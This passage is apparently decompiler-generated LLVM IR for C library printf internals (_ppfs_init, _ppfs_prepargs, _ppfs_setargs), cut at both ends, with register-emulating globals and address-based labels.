; uselistorder directives
  uselistorder i32 %v1_805c23b, { 1, 0 }
  uselistorder i32 %v3_805c230, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805c215, { 1, 0 }
  uselistorder i32 %v2_805c20f, { 1, 2, 0 }
  uselistorder i32 %v0_805c24349, { 1, 0 }
  uselistorder i32 %v1_805c20f, { 1, 0 }
  uselistorder i32 %v0_805c1f0, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_805c17d, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_805c155, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805c12e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805c102, { 1, 0, 2 }
  uselistorder i32 %v6_805c0ef, { 1, 0 }
  uselistorder i32 %v1_805c0ec, { 1, 0 }
  uselistorder i32 %v0_805c0e5, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805c06f, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_805c07f, { 2, 3, 1, 0 }
  uselistorder i32 %v0_805c02c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805bfe0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_805bfc6, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_805bf5f, { 1, 0, 2 }
  uselistorder i32 %v0_805bf13, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_805bee3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_805bf36, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_805bebf, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805be78, { 1, 0 }
  uselistorder i32 %v1_805be85, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_805bdd0, { 3, 12, 13, 5, 4, 7, 6, 8, 11, 0, 1, 2, 10, 9, 14, 15 }
  uselistorder i32 %v0_805bdd0.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805bdcc, { 1, 0 }
  uselistorder i32 %v1_805bdcc.pre, { 1, 0 }
  uselistorder i32 %v1_805bdcb, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_805bdc8, { 1, 0 }
  uselistorder i32 %v2_805bdcc72, { 1, 0 }
  uselistorder i32 %v3_805bdb2, { 1, 0 }
  uselistorder i32 %v1_805bd6e, { 0, 2, 3, 1 }
  uselistorder i32 %v3_805bd62, { 1, 0 }
  uselistorder i32 %v2_805bd3a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805bd3e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805bd28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 5, 4, 8, 0, 7, 6, 3, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 25, 21, 22, 23, 26, 24, 27, 28, 29, 30 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805c24a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805c243, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_805c20b, { 1, 0 }
  uselistorder label %dec_label_pc_805c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_805c1c1, { 1, 0 }
  uselistorder label %dec_label_pc_805c1aa, { 1, 0 }
  uselistorder label %dec_label_pc_805c155, { 1, 0 }
  uselistorder label %dec_label_pc_805c127, { 1, 0 }
  uselistorder label %dec_label_pc_805c10c, { 1, 0 }
  uselistorder label %dec_label_pc_805c0f6, { 1, 0 }
  uselistorder label %dec_label_pc_805c0e2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c0d6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805c06f, { 1, 0 }
  uselistorder label %dec_label_pc_805c062, { 1, 0 }
  uselistorder label %dec_label_pc_805bfed, { 1, 0 }
  uselistorder label %dec_label_pc_805bf81, { 1, 0 }
  uselistorder label %dec_label_pc_805bf36, { 1, 0 }
  uselistorder label %dec_label_pc_805bf27, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805bf02, { 1, 0 }
  uselistorder label %dec_label_pc_805beed, { 1, 0 }
  uselistorder label %dec_label_pc_805bed4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805be85, { 1, 0 }
  uselistorder label %dec_label_pc_805be6c, { 1, 0 }
  uselistorder label %dec_label_pc_805be58, { 1, 0 }
  uselistorder label %dec_label_pc_805be53, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805be34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805bdc1, { 1, 0 }
  uselistorder label %dec_label_pc_805bdb9, { 1, 0 }
  uselistorder label %dec_label_pc_805bd65, { 1, 0 }
  uselistorder label %dec_label_pc_805bd5a, { 1, 0 }
  uselistorder label %dec_label_pc_805bd30.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c258 = load i32, i32* @esi, align 4
  %v0_805c259 = load i32, i32* @ebx, align 4
  store i32 %v0_805c259, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805c26d = bitcast i32* %arg1 to i8*
  %v4_805c26d = call i32 @__GI_memset(i8* %v3_805c26d, i32 0, i32 188)
  store i32 %v4_805c26d, i32* %eax.global-to-local, align 4
  %v0_805c272 = load i32, i32* @ebx, align 4
  %v1_805c272 = add i32 %v0_805c272, 24
  %v2_805c272 = inttoptr i32 %v1_805c272 to i32*
  %v3_805c272 = load i32, i32* %v2_805c272, align 4
  %v4_805c272 = add i32 %v3_805c272, -1
  store i32 %v4_805c272, i32* %v2_805c272, align 4
  %v0_805c275 = load i32, i32* @esi, align 4
  %v1_805c275 = load i32, i32* @ebx, align 4
  %v2_805c275 = inttoptr i32 %v1_805c275 to i32*
  store i32 %v0_805c275, i32* %v2_805c275, align 4
  %v0_805c277 = load i32, i32* @ebx, align 4
  %v1_805c277 = add i32 %v0_805c277, 40
  store i32 %v1_805c277, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c282

dec_label_pc_805c282:                             ; preds = %dec_label_pc_805c282, %entry
  %v0_805c282 = phi i32 [ %v1_805c288, %dec_label_pc_805c282 ], [ %v1_805c277, %entry ]
  %v1_805c282 = inttoptr i32 %v0_805c282 to i32*
  store i32 8, i32* %v1_805c282, align 4
  %v0_805c288 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c288 = add i32 %v0_805c288, 4
  store i32 %v1_805c288, i32* %eax.global-to-local, align 4
  %v0_805c28b = load i32, i32* %edx.global-to-local, align 4
  %v1_805c28b = add i32 %v0_805c28b, -1
  %v8_805c28b = icmp eq i32 %v1_805c28b, 0
  store i32 %v1_805c28b, i32* %edx.global-to-local, align 4
  %v1_805c28c = icmp eq i1 %v8_805c28b, false
  br i1 %v1_805c28c, label %dec_label_pc_805c282, label %dec_label_pc_805c28e

dec_label_pc_805c28e:                             ; preds = %dec_label_pc_805c282
  %v0_805c28e = load i32, i32* @esi, align 4
  store i32 %v0_805c28e, i32* %eax.global-to-local, align 4
  %v1_805c2b920 = inttoptr i32 %v0_805c28e to i8*
  %v2_805c2b921 = load i8, i8* %v1_805c2b920, align 1
  %v3_805c2b922 = zext i8 %v2_805c2b921 to i32
  %v5_805c2b923 = and i32 %v1_805c28b, -256
  %v6_805c2b924 = or i32 %v3_805c2b922, %v5_805c2b923
  store i32 %v6_805c2b924, i32* %edx.global-to-local, align 4
  %v4_805c2bb25 = icmp eq i8 %v2_805c2b921, 0
  %v1_805c2bd26 = icmp eq i1 %v4_805c2bb25, false
  br i1 %v1_805c2bd26, label %dec_label_pc_805c297, label %dec_label_pc_805c2bf

dec_label_pc_805c297:                             ; preds = %dec_label_pc_805c28e, %dec_label_pc_805c2b9.backedge
  %v6_805c2b929 = phi i32 [ %v6_805c2b9, %dec_label_pc_805c2b9.backedge ], [ %v6_805c2b924, %dec_label_pc_805c28e ]
  %v2_805c2b928 = phi i8 [ %v2_805c2b9, %dec_label_pc_805c2b9.backedge ], [ %v2_805c2b921, %dec_label_pc_805c28e ]
  %v0_805c29c27 = phi i32 [ %v0_805c29c.be, %dec_label_pc_805c2b9.backedge ], [ %v0_805c28e, %dec_label_pc_805c28e ]
  %v10_805c297 = icmp eq i8 %v2_805c2b928, 37
  %v1_805c29a = icmp eq i1 %v10_805c297, false
  br i1 %v1_805c29a, label %dec_label_pc_805c2b8, label %dec_label_pc_805c29c

dec_label_pc_805c29c:                             ; preds = %dec_label_pc_805c297
  %v1_805c29c = add i32 %v0_805c29c27, 1
  store i32 %v1_805c29c, i32* %eax.global-to-local, align 4
  %v1_805c29d = inttoptr i32 %v1_805c29c to i8*
  %v2_805c29d = load i8, i8* %v1_805c29d, align 1
  %v11_805c29d = icmp eq i8 %v2_805c29d, 37
  br i1 %v11_805c29d, label %dec_label_pc_805c2b8, label %dec_label_pc_805c2a2

dec_label_pc_805c2a2:                             ; preds = %dec_label_pc_805c29c
  %v1_805c2a5 = load i32, i32* @ebx, align 4
  %v2_805c2a5 = inttoptr i32 %v1_805c2a5 to i32*
  store i32 %v1_805c29c, i32* %v2_805c2a5, align 4
  %v0_805c2a7 = load i32, i32* @ebx, align 4
  %v1_805c2a8 = inttoptr i32 %v0_805c2a7 to i32*
  %v2_805c2a8 = call i32 @_ppfs_parsespec(i32* %v1_805c2a8)
  store i32 %v2_805c2a8, i32* %eax.global-to-local, align 4
  %v2_805c2b0 = icmp slt i32 %v2_805c2a8, 0
  br i1 %v2_805c2b0, label %dec_label_pc_805c2c3, label %dec_label_pc_805c2b4

dec_label_pc_805c2b4:                             ; preds = %dec_label_pc_805c2a2
  %v0_805c2b4 = load i32, i32* @ebx, align 4
  %v1_805c2b4 = inttoptr i32 %v0_805c2b4 to i32*
  %v2_805c2b4 = load i32, i32* %v1_805c2b4, align 4
  %v4_805c2b9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c2b9.backedge

dec_label_pc_805c2b8:                             ; preds = %dec_label_pc_805c29c, %dec_label_pc_805c297
  %v0_805c2b8 = phi i32 [ %v1_805c29c, %dec_label_pc_805c29c ], [ %v0_805c29c27, %dec_label_pc_805c297 ]
  %v1_805c2b8 = add i32 %v0_805c2b8, 1
  br label %dec_label_pc_805c2b9.backedge

dec_label_pc_805c2b9.backedge:                    ; preds = %dec_label_pc_805c2b8, %dec_label_pc_805c2b4
  %v4_805c2b9.be = phi i32 [ %v4_805c2b9.pre.pre, %dec_label_pc_805c2b4 ], [ %v6_805c2b929, %dec_label_pc_805c2b8 ]
  %v0_805c29c.be = phi i32 [ %v2_805c2b4, %dec_label_pc_805c2b4 ], [ %v1_805c2b8, %dec_label_pc_805c2b8 ]
  store i32 %v0_805c29c.be, i32* %eax.global-to-local, align 4
  %v1_805c2b9 = inttoptr i32 %v0_805c29c.be to i8*
  %v2_805c2b9 = load i8, i8* %v1_805c2b9, align 1
  %v3_805c2b9 = zext i8 %v2_805c2b9 to i32
  %v5_805c2b9 = and i32 %v4_805c2b9.be, -256
  %v6_805c2b9 = or i32 %v3_805c2b9, %v5_805c2b9
  store i32 %v6_805c2b9, i32* %edx.global-to-local, align 4
  %v4_805c2bb = icmp eq i8 %v2_805c2b9, 0
  %v1_805c2bd = icmp eq i1 %v4_805c2bb, false
  br i1 %v1_805c2bd, label %dec_label_pc_805c297, label %dec_label_pc_805c2b9.dec_label_pc_805c2bf_crit_edge

dec_label_pc_805c2b9.dec_label_pc_805c2bf_crit_edge: ; preds = %dec_label_pc_805c2b9.backedge
  %v0_805c2bf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c2bf

dec_label_pc_805c2bf:                             ; preds = %dec_label_pc_805c2b9.dec_label_pc_805c2bf_crit_edge, %dec_label_pc_805c28e
  %v0_805c2bf = phi i32 [ %v0_805c2bf.pre, %dec_label_pc_805c2b9.dec_label_pc_805c2bf_crit_edge ], [ %v0_805c28e, %dec_label_pc_805c28e ]
  %v1_805c2bf = load i32, i32* @ebx, align 4
  %v2_805c2bf = inttoptr i32 %v1_805c2bf to i32*
  store i32 %v0_805c2bf, i32* %v2_805c2bf, align 4
  br label %dec_label_pc_805c2c3

dec_label_pc_805c2c3:                             ; preds = %dec_label_pc_805c2a2, %dec_label_pc_805c2bf
  %storemerge = phi i32 [ 0, %dec_label_pc_805c2bf ], [ -1, %dec_label_pc_805c2a2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805c2c3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c2c3, i32* @edx, align 4
  %v2_805c2c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c2c4, i32* @ebx, align 4
  store i32 %v0_805c258, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_805c2b9, { 1, 0 }
  uselistorder i8 %v2_805c2b9, { 1, 2, 0 }
  uselistorder i32 %v0_805c29c.be, { 2, 1, 0 }
  uselistorder i32 %v0_805c29c27, { 1, 0 }
  uselistorder i32 %v0_805c28e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805c28b, { 0, 2, 1 }
  uselistorder i32 %v1_805c288, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_805c2c3, { 1, 0 }
  uselistorder label %dec_label_pc_805c297, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805c2c8 = load i32, i32* @esi, align 4
  %v0_805c2c9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805c2d5 = add i32 %arg1, 24
  %v2_805c2d5 = inttoptr i32 %v1_805c2d5 to i32*
  %v3_805c2d5 = load i32, i32* %v2_805c2d5, align 4
  %v2_805c2d8 = add i32 %arg1, 76
  %v3_805c2d8 = inttoptr i32 %v2_805c2d8 to i32*
  store i32 %arg2, i32* %v3_805c2d8, align 4
  %tmp8 = icmp slt i32 %v3_805c2d5, 1
  br i1 %tmp8, label %dec_label_pc_805c306, label %dec_label_pc_805c2df

dec_label_pc_805c2df:                             ; preds = %entry
  %v1_805c2e2 = load i32, i32* @ebx, align 4
  %v2_805c2e2 = add i32 %v1_805c2e2, 28
  %v3_805c2e2 = inttoptr i32 %v2_805c2e2 to i32*
  store i32 %v3_805c2d5, i32* %v3_805c2e2, align 4
  %v0_805c2e5 = load i32, i32* @ebx, align 4
  %v1_805c2e5 = add i32 %v0_805c2e5, 24
  %v2_805c2e5 = inttoptr i32 %v1_805c2e5 to i32*
  store i32 0, i32* %v2_805c2e5, align 4
  %v0_805c2ec = load i32, i32* @ebx, align 4
  %v1_805c2ec = add i32 %v0_805c2ec, 4
  %v2_805c2ec = inttoptr i32 %v1_805c2ec to i32*
  store i32 0, i32* %v2_805c2ec, align 4
  %v0_805c2f3 = load i32, i32* @ebx, align 4
  %v1_805c2f3 = add i32 %v0_805c2f3, 8
  %v2_805c2f3 = inttoptr i32 %v1_805c2f3 to i32*
  store i32 0, i32* %v2_805c2f3, align 4
  %v0_805c2fa = load i32, i32* @ebx, align 4
  %v1_805c2fb = call i32 @_ppfs_setargs(i32 %v0_805c2fa)
  %v1_805c300 = load i32, i32* @ebx, align 4
  %v2_805c300 = add i32 %v1_805c300, 24
  %v3_805c300 = inttoptr i32 %v2_805c300 to i32*
  store i32 %v3_805c2d5, i32* %v3_805c300, align 4
  br label %dec_label_pc_805c306

dec_label_pc_805c306:                             ; preds = %entry, %dec_label_pc_805c2df
  %v2_805c306 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805c2c9, i32* @ebx, align 4
  store i32 %v0_805c2c8, i32* @esi, align 4
  ret i32 %v2_805c306

; uselistorder directives
  uselistorder i32 %v3_805c2d5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c306, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c30d = load i32, i32* @ebx, align 4
  store i32 %v0_805c30d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805c312 = add i32 %arg1, 80
  store i32 %v1_805c312, i32* %ebx.global-to-local, align 4
  %v1_805c315 = add i32 %arg1, 24
  %v2_805c315 = inttoptr i32 %v1_805c315 to i32*
  %v3_805c315 = load i32, i32* %v2_805c315, align 4
  %v4_805c315 = icmp eq i32 %v3_805c315, 0
  %v1_805c319 = icmp eq i1 %v4_805c315, false
  %v1_805c3cf = add i32 %arg1, 8
  %v2_805c3cf = inttoptr i32 %v1_805c3cf to i32*
  %v3_805c3cf = load i32, i32* %v2_805c3cf, align 4
  %v8_805c3cf = icmp eq i32 %v3_805c3cf, -2147483648
  %v1_805c3d6 = icmp eq i1 %v8_805c3cf, false
  br i1 %v1_805c319, label %dec_label_pc_805c3cf, label %dec_label_pc_805c31f

dec_label_pc_805c31f:                             ; preds = %entry
  br i1 %v1_805c3d6, label %dec_label_pc_805c339, label %dec_label_pc_805c328

dec_label_pc_805c328:                             ; preds = %dec_label_pc_805c31f
  %v1_805c328 = add i32 %arg1, 76
  %v2_805c328 = inttoptr i32 %v1_805c328 to i32*
  %v3_805c328 = load i32, i32* %v2_805c328, align 4
  store i32 %v3_805c328, i32* %eax.global-to-local, align 4
  %v1_805c32b = add i32 %v3_805c328, 4
  store i32 %v1_805c32b, i32* %edx.global-to-local, align 4
  store i32 %v1_805c32b, i32* %v2_805c328, align 4
  %v0_805c331 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c331 = inttoptr i32 %v0_805c331 to i32*
  %v2_805c331 = load i32, i32* %v1_805c331, align 4
  store i32 %v2_805c331, i32* %eax.global-to-local, align 4
  %v1_805c333 = load i32, i32* @ecx, align 4
  %v2_805c333 = add i32 %v1_805c333, 80
  %v3_805c333 = inttoptr i32 %v2_805c333 to i32*
  store i32 %v2_805c331, i32* %v3_805c333, align 4
  %v0_805c336 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c336 = load i32, i32* @ecx, align 4
  %v2_805c336 = add i32 %v1_805c336, 8
  %v3_805c336 = inttoptr i32 %v2_805c336 to i32*
  store i32 %v0_805c336, i32* %v3_805c336, align 4
  %v0_805c339.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c339

dec_label_pc_805c339:                             ; preds = %dec_label_pc_805c31f, %dec_label_pc_805c328
  %v1_805c348 = phi i32 [ %arg1, %dec_label_pc_805c31f ], [ %v0_805c339.pre, %dec_label_pc_805c328 ]
  %v1_805c339 = add i32 %v1_805c348, 4
  %v2_805c339 = inttoptr i32 %v1_805c339 to i32*
  %v3_805c339 = load i32, i32* %v2_805c339, align 4
  %v8_805c339 = icmp eq i32 %v3_805c339, -2147483648
  %v1_805c340 = icmp eq i1 %v8_805c339, false
  br i1 %v1_805c340, label %dec_label_pc_805c353, label %dec_label_pc_805c342

dec_label_pc_805c342:                             ; preds = %dec_label_pc_805c339
  %v1_805c342 = add i32 %v1_805c348, 76
  %v2_805c342 = inttoptr i32 %v1_805c342 to i32*
  %v3_805c342 = load i32, i32* %v2_805c342, align 4
  store i32 %v3_805c342, i32* %eax.global-to-local, align 4
  %v1_805c345 = add i32 %v3_805c342, 4
  store i32 %v1_805c345, i32* %edx.global-to-local, align 4
  store i32 %v1_805c345, i32* %v2_805c342, align 4
  %v0_805c34b = load i32, i32* %eax.global-to-local, align 4
  %v1_805c34b = inttoptr i32 %v0_805c34b to i32*
  %v2_805c34b = load i32, i32* %v1_805c34b, align 4
  store i32 %v2_805c34b, i32* %eax.global-to-local, align 4
  %v1_805c34d = load i32, i32* @ecx, align 4
  %v2_805c34d = add i32 %v1_805c34d, 80
  %v3_805c34d = inttoptr i32 %v2_805c34d to i32*
  store i32 %v2_805c34b, i32* %v3_805c34d, align 4
  %v0_805c350 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c350 = load i32, i32* @ecx, align 4
  %v2_805c350 = add i32 %v1_805c350, 4
  %v3_805c350 = inttoptr i32 %v2_805c350 to i32*
  store i32 %v0_805c350, i32* %v3_805c350, align 4
  %v1_805c3c817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c353

dec_label_pc_805c353:                             ; preds = %dec_label_pc_805c339, %dec_label_pc_805c342
  %v1_805c3c817 = phi i32 [ %v1_805c348, %dec_label_pc_805c339 ], [ %v1_805c3c817.pre, %dec_label_pc_805c342 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805c3c818 = add i32 %v1_805c3c817, 28
  %v3_805c3c819 = inttoptr i32 %v2_805c3c818 to i32*
  %v4_805c3c820 = load i32, i32* %v3_805c3c819, align 4
  %v5_805c3cb22 = icmp sgt i32 %v4_805c3c820, 0
  br i1 %v5_805c3cb22, label %dec_label_pc_805c357, label %dec_label_pc_805c3fd.loopexit

dec_label_pc_805c357:                             ; preds = %dec_label_pc_805c353, %dec_label_pc_805c3c7
  %v1_805c3c824 = phi i32 [ %v1_805c3c8, %dec_label_pc_805c3c7 ], [ %v1_805c3c817, %dec_label_pc_805c353 ]
  %v1_805c35723 = phi i32 [ %v1_805c3c7, %dec_label_pc_805c3c7 ], [ 0, %dec_label_pc_805c353 ]
  %v2_805c357 = mul i32 %v1_805c35723, 4
  %v3_805c357 = add i32 %v2_805c357, 40
  %v4_805c357 = add i32 %v3_805c357, %v1_805c3c824
  %v5_805c357 = inttoptr i32 %v4_805c357 to i32*
  %v6_805c357 = load i32, i32* %v5_805c357, align 4
  store i32 %v6_805c357, i32* %eax.global-to-local, align 4
  %v1_805c35b = add i32 %v6_805c357, -8
  %v9_805c35b = icmp eq i32 %v1_805c35b, 0
  br i1 %v9_805c35b, label %dec_label_pc_805c3c7, label %dec_label_pc_805c360

dec_label_pc_805c360:                             ; preds = %dec_label_pc_805c357
  %v10_805c35b = icmp slt i32 %v1_805c35b, 0
  %v6_805c35b = sub i32 7, %v6_805c357
  %v7_805c35b = and i32 %v6_805c35b, %v6_805c357
  %v8_805c35b = icmp slt i32 %v7_805c35b, 0
  %v1_805c360 = add i32 %v1_805c3c824, 76
  %v2_805c360 = inttoptr i32 %v1_805c360 to i32*
  %v3_805c360 = load i32, i32* %v2_805c360, align 4
  store i32 %v3_805c360, i32* %edx.global-to-local, align 4
  %v3_805c363 = icmp eq i1 %v10_805c35b, %v8_805c35b
  br i1 %v3_805c363, label %dec_label_pc_805c373, label %dec_label_pc_805c365

dec_label_pc_805c365:                             ; preds = %dec_label_pc_805c360
  %tmp15 = icmp slt i32 %v6_805c357, 3
  %v9_805c36c = icmp eq i32 %v6_805c357, 7
  %v1_805c36f = icmp eq i1 %v9_805c36c, false
  %or.cond = or i1 %tmp15, %v1_805c36f
  br i1 %or.cond, label %dec_label_pc_805c3ba, label %dec_label_pc_805c39c

dec_label_pc_805c373:                             ; preds = %dec_label_pc_805c360
  %tmp16 = icmp sgt i32 %v6_805c357, 1024
  br i1 %tmp16, label %dec_label_pc_805c37c, label %dec_label_pc_805c3ba

dec_label_pc_805c37c:                             ; preds = %dec_label_pc_805c373
  %v6_805c37c = icmp eq i32 %v6_805c357, 2048
  br i1 %v6_805c37c, label %dec_label_pc_805c38c, label %dec_label_pc_805c383

dec_label_pc_805c383:                             ; preds = %dec_label_pc_805c37c
  %v9_805c383 = icmp eq i32 %v6_805c357, 2055
  %v1_805c388 = icmp eq i1 %v9_805c383, false
  br i1 %v1_805c388, label %dec_label_pc_805c3ba, label %dec_label_pc_805c3ab

dec_label_pc_805c38c:                             ; preds = %dec_label_pc_805c37c
  %v1_805c38c = add i32 %v3_805c360, 8
  store i32 %v1_805c38c, i32* %eax.global-to-local, align 4
  store i32 %v1_805c38c, i32* %v2_805c360, align 4
  %v0_805c392 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c392 = inttoptr i32 %v0_805c392 to i32*
  %v2_805c392 = load i32, i32* %v1_805c392, align 4
  store i32 %v2_805c392, i32* %eax.global-to-local, align 4
  %v1_805c394 = add i32 %v0_805c392, 4
  %v2_805c394 = inttoptr i32 %v1_805c394 to i32*
  %v3_805c394 = load i32, i32* %v2_805c394, align 4
  store i32 %v3_805c394, i32* %edx.global-to-local, align 4
  %v1_805c397 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c397 = add i32 %v1_805c397, 4
  %v3_805c397 = inttoptr i32 %v2_805c397 to i32*
  store i32 %v3_805c394, i32* %v3_805c397, align 4
  %v0_805c3c2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c3c2

dec_label_pc_805c39c:                             ; preds = %dec_label_pc_805c365
  %v3_805c39c = load i32, i32* %v2_805c360, align 4
  store i32 %v3_805c39c, i32* %edx.global-to-local, align 4
  %v1_805c39f = add i32 %v3_805c39c, 8
  store i32 %v1_805c39f, i32* %eax.global-to-local, align 4
  store i32 %v1_805c39f, i32* %v2_805c360, align 4
  %v0_805c3a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c3a5 = inttoptr i32 %v0_805c3a5 to double*
  %v2_805c3a5 = load double, double* %v1_805c3a5, align 4
  %v2_805c3a7 = load i32, i32* %ebx.global-to-local, align 4
  %v4_805c3a7 = inttoptr i32 %v2_805c3a7 to double*
  store double %v2_805c3a5, double* %v4_805c3a7, align 4
  br label %dec_label_pc_805c3c4

dec_label_pc_805c3ab:                             ; preds = %dec_label_pc_805c383
  %v3_805c3ab = load i32, i32* %v2_805c360, align 4
  store i32 %v3_805c3ab, i32* %edx.global-to-local, align 4
  %v1_805c3ae = add i32 %v3_805c3ab, 12
  store i32 %v1_805c3ae, i32* %eax.global-to-local, align 4
  store i32 %v1_805c3ae, i32* %v2_805c360, align 4
  %v0_805c3b4 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c3b4 = inttoptr i32 %v0_805c3b4 to x86_fp80*
  %v2_805c3b4 = load x86_fp80, x86_fp80* %v1_805c3b4, align 4
  %v2_805c3b6 = load i32, i32* %ebx.global-to-local, align 4
  %v3_805c3b6 = inttoptr i32 %v2_805c3b6 to x86_fp80*
  store x86_fp80 %v2_805c3b4, x86_fp80* %v3_805c3b6, align 4
  br label %dec_label_pc_805c3c4

dec_label_pc_805c3ba:                             ; preds = %dec_label_pc_805c365, %dec_label_pc_805c373, %dec_label_pc_805c383
  %v1_805c3ba = add i32 %v3_805c360, 4
  store i32 %v1_805c3ba, i32* %eax.global-to-local, align 4
  store i32 %v1_805c3ba, i32* %v2_805c360, align 4
  %v0_805c3c0 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c3c0 = inttoptr i32 %v0_805c3c0 to i32*
  %v2_805c3c0 = load i32, i32* %v1_805c3c0, align 4
  store i32 %v2_805c3c0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c3c2

dec_label_pc_805c3c2:                             ; preds = %dec_label_pc_805c38c, %dec_label_pc_805c3ba
  %v0_805c3c2 = phi i32 [ %v0_805c3c2.pre, %dec_label_pc_805c38c ], [ %v2_805c3c0, %dec_label_pc_805c3ba ]
  %v1_805c3c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c3c2 = inttoptr i32 %v1_805c3c2 to i32*
  store i32 %v0_805c3c2, i32* %v2_805c3c2, align 4
  %v0_805c3c4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805c3c4

dec_label_pc_805c3c4:                             ; preds = %dec_label_pc_805c3ab, %dec_label_pc_805c39c, %dec_label_pc_805c3c2
  %v0_805c3c4 = phi i32 [ %v2_805c3b6, %dec_label_pc_805c3ab ], [ %v2_805c3a7, %dec_label_pc_805c39c ], [ %v0_805c3c4.pre, %dec_label_pc_805c3c2 ]
  %v1_805c3c4 = add i32 %v0_805c3c4, 12
